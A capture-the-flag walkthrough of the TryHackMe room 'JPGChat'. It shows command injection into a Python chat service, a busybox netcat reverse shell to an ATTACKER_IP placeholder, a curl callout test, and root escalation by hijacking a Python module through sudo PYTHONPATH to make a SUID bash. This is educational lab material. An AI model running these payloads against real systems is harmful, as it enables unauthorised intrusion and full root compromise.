## Hello everyone!



Today, we will explore *JPGChat*, an easy-level room from **TryHackMe**.

Without further ado, let’s get started!

![image](/THM/JPGChat/JPGChat_images/1.png)




## Information Gathering


First, we will perform an aggressive **Nmap** scan to gather as much information as possible about the target:

![image](/THM/JPGChat/JPGChat_images/2.png)

(Ensure that you have added the following line   `TARGET_IP     jpgchat.thm`   to your local `/etc/hosts` file to enable DNS resolution)

There are two exposed services:

**SSH** (OpenSSH 7.7p2 | 22)

**HTTP** (? | 3000)

An intriguing service is running under the **HTTP** port 3000. Let’s inspect it with our web browser:

![image](/THM/JPGChat/JPGChat_images/3.png)

We are greeted with a static page indicating that the source code of the service is available at their *admin’s github*. Searching for *JPGChat admin’s github* on Google led me to this GitHub repository:

![image](/THM/JPGChat/JPGChat_images/4.png)

We can observe the application source code here. As we can see, the source code is written in **Python**. Moreover, we can inspect that the script calls system commands through `os.system`:

![image](/THM/JPGChat/JPGChat_images/5.png)

The script appears to execute a `echo` command that add data on two occasions. It appears that we can be prompted to enter our name and a text report.

We may be able to abuse this functionality and execute arbitrary code if we find a way to input and submit some strings to the web application. 




## Initial Access


Let’s attempt to access this service through a terminal using `netcat` in order to interact dynamically with it:

![image](/THM/JPGChat/JPGChat_images/6.png)

As expected, we’re facing the same content we discovered earlier via our web browser. But now, we are able to interact with the service. Let’s attempt to submit "`[REPORT]`" to see what happens:

![image](/THM/JPGChat/JPGChat_images/7.png)

We can observe that we are prompting to insert strings twice. If you remember, this is exactly at theses moments that the application executes a `echo` system command. Since our input is transferred to the command directly, we can attempt to escape it by adding a semicolon (`;`).

Let’s check if this works by executing a `curl` command pointing to our local machine. The test payload is simply as follows:

`; curl http://ATTACKER_IP:PORT` 

(Ensure to set up a **Python serve**r or a **netcat listener** configured respectively to your payload)

![image](/THM/JPGChat/JPGChat_images/8.png)

Our Command Injection successfully worked! We can escape the current `echo` command by adding a semicolon in order to execute other system commands. We can leverage this vulnerability to gain initial foothold with a reverse shell. We can execute the following payload:

`; busybox nc ATTACKER_IP NC_PORT -e sh`

(ensure that you have setup a netcat listener to catch the connection)

![image](/THM/JPGChat/JPGChat_images/9.png)

After pressing *Enter* twice, the reverse shell has been successfully initiated, granting initial access on the target system as the **wes** user. Since our current shell does not have job control, we can stabilize it in order to execute system commands properly with the following command:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

Listing the /home directory doesn’t reveal other users present on the system, which means we can already retrieve the user flag in our `/home/wes` directory:

![image](/THM/JPGChat/JPGChat_images/10.png)




## Privilege Escalation

We now need to escalate our current privileges to **root** in order to retrieve the final flag. It is a good practice to start enumerating privilege escalation vectors by running `sudo -l` to list potential commands that could be run with **root privileges**:

![image](/THM/JPGChat/JPGChat_images/11.png)

The sudo rule allows execution of a Python script as **root** without providing any password with the `SETENV` option enabled, which allows us to define an environment variable along the script execution. Since `PYTHONPATH` is preserved by sudo and `SETENV` is enabled, it is possible to perform a **Python module hijacking** attack by supplying a malicious  module through a user-controlled directory, resulting in arbitrary code execution as **root**. But we first need to identify a valid module to usurpate in the `test_module.py` script. Let’s inspect it:

![image](/THM/JPGChat/JPGChat_images/12.png)

This simple script calls a module named `compare` that we could hijack by creating a malicious `compare.py` script in an accessible directory that we will specify through the `PYTHONPATH` environment variable. Hence, the `test_module.py` script (running with **root privileges**) will look at the specified folder before the expected `sys.path` list. Since the program will find the malicious `compare.py` module before the legitimate one, it will be executed instead, leading to privilege escalation through Python module hijacking. The malicious module can be created as follows:

`#!/usr/bin/env python3`

`import os`

`os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")`

This script will copy the `/bin/bash` binary into an accessible directory (such as `/tmp`) before adding the **SUID bit** set on it. The SUID bit allows a binary to be executed with the privileges of its owner. Because the malicious script will be interpreted as a Python module by the `test_module.py` script executed as **root**, the SUID bit will allow us to execute `/bin/bash` with **root permissions**, leading to a **root Bash shell** after execution.

After creating the malicious `compare.py` script in the `/tmp` folder and giving to it execute permissions, we will execute the `test_module.py` script via `sudo` specifying the module path we want the script to check first through the `PYTHONPATH` environment variable. The command will be as follows:

`sudo PYTHONPATH=/tmp /usr/bin/python3 /opt/development/test_module.py`

![image](/THM/JPGChat/JPGChat_images/13.png)

The Python module has been hijacked! This allowed us to execute a malicious Python script we control instead. We will now execute the `rootbash` binary (which is simply `/bin/bash` with the root SUID bit set on it) with the `-p` option to prevent the executable from dropping its **root privileges** as soon as it runs:

![image](/THM/JPGChat/JPGChat_images/14.png)

We successfully escalated our privileges to **root**, granting full access and control over the machine. We can now navigate to the `/root` directory in order to retrieve the final flag:

![image](/THM/JPGChat/JPGChat_images/15.png)

Challenge completed!

![image](/THM/JPGChat/JPGChat_images/16.png)



## Conclusion

This room was very pleasant to complete. Starting from a basic enumeration, we discovered an intriguing service running on port **3000**. We learnt from its source code that a `echo` system command was executed based on user input. By accessing the service dynamically via `netcat`, we were able to perform **command injection** by breaking out of the current command context with a semicolon string due to filter lacking. This allowed us to obtain initial foothold on the system as the **wes** user. During the privilege escalation phase, we identified a Python script which could be run with **root privileges**. Moreover, the `sudo` configuration allowed through `SETENV` to define an environment variable of our choice along the script execution. This allowed us to hijack a Python module with a malicious Python script that we controlled, which led to execute arbitrary system commands with **root permissions**. The script consists of generating a `/bin/bash` copy with the **SUID bit** set on it, leading to a **root shell** granting total access and control.


**Thank you for reading!**
